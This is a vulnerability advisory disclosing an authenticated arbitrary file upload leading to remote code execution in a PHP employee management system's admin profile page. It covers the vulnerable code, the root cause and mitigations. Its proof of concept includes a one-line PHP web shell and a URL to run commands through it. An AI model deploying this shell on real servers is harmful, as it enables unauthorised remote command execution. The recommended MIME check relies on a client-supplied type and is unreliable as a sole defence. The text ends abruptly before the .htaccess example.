# Vulnerability Advisory: RCE via Authenticated Arbitary File upload
- **Application Name**: Employee management system 
- **Software Link**: [Download Link](https://www.sourcecodester.com/php/17689/best-employee-management-system-php.html/)  
- **Vendor Homepage**: [Vendor Homepage](https://www.sourcecodester.com/)  
- **Bug**: Remote Code Execution
- **Author**: sh3rl0ckpgp  



## About Project:
This employee management system in PHP that serves as an essential tool for organizations seeking to optimize their human resource management practices through effective software development in PHP.  You can say human resource management system in php also. Its implementation can lead to improved operational efficiency and enhanced employee-related record management.


## Vulnerability Overview
A security vulnerability has been identified in the file upload functionality of the provided code, which allows unrestricted file uploads, potentially leading to Remote Code Execution (RCE). This issue arises due to the lack of appropriate validation and sanitization of uploaded files, allowing an attacker to upload malicious files (such as executable scripts) that can then be executed on the server.


## Vulnerable Code Section:
- in `/admin/profile.php`:
```
$target_dir = "../assets/uploadImage/Profile/";
$website_logo = basename($_FILES["website_image"]["name"]);
if($_FILES["website_image"]["tmp_name"]!=''){
    $image = $target_dir . basename($_FILES["website_image"]["name"]);
    if (move_uploaded_file($_FILES["website_image"]["tmp_name"], $image)) {
        @unlink("../assets/uploadImage/Profile/".$_POST['old_website_image']);
    } else {
        echo "Sorry, there was an error uploading your file.";
    }
} else {
    $website_logo =$_POST['old_website_image'];
}
```
## Proof of Concept (PoC):
- create malicious file like shell.php
- write in the file this payload in order to execute the commands: `<?php system($_GET['cmd']);?>`
- upload the file to profile section
- access via http://localhost/hr_soft/assets/uploadImage/Profile/malicious.php?cmd=ipconfig

![image](https://github.com/user-attachments/assets/a6d4fed0-0aaa-4caf-9217-d2234c785f5a)

![image](https://github.com/user-attachments/assets/c72f3d00-07b0-430c-9e1b-079406874ad7)

![image](https://github.com/user-attachments/assets/7955de2a-6223-456c-978c-f964672d590b)

![image](https://github.com/user-attachments/assets/cd208a5d-9ffb-4596-ae40-ae97fe9ac995)



## Root Cause:
The code does not restrict the file types or validate the content of uploaded files, allowing attackers to upload files with executable extensions (e.g., .php, .sh). Without validation, an attacker can upload a malicious file, which could then be executed, resulting in RCE.

## Recommendation for Mitigation

Restrict File Types: Implement server-side checks to allow only specific image file types (e.g., .jpg, .png).

```
$allowed_types = array("image/jpeg", "image/png");
if (!in_array($_FILES["website_image"]["type"], $allowed_types)) {
    die("Only JPG and PNG files are allowed.");
}
```
- Rename Uploaded Files: Use a random or unique name for each uploaded file to prevent overwriting and tampering.
- Move File to Non-Executable Directory: Store uploads in a directory without execute permissions to prevent PHP code execution.
- Server Configuration: Disable PHP execution in the upload directory by configuring .htaccess:

